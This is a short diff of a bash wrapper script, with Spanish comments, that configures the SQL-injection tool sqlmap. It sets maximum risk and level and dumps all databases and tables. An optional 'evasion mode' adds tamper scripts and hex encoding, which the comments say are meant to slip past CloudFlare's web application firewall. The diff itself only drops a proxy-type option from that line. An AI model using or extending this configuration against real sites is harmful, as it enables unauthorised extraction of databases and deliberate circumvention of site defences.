@@ -55,7 +55,7 @@ FLAGS="--batch --risk=3 --level=5 --threads=5 --dbs --tables --dump --random-age
 if [[ "$WAF_EVADE" == "s" ]]; then
     echo "[!] MODO EVASIÓN ACTIVADO: Usando scripts tamper para saltar CloudFlare..."
     # Scripts específicos para ofuscar payloads y saltar filtros WAF
-    FLAGS="$FLAGS --tamper=between,charencode,charunicodeencode,equaltolike,randomcase --hex --proxy-type=HTTP"
+    FLAGS="$FLAGS --tamper=between,charencode,charunicodeencode,equaltolike,randomcase --hex"
 fi
 
 if [ ! -z "$POST_DATA" ]; then
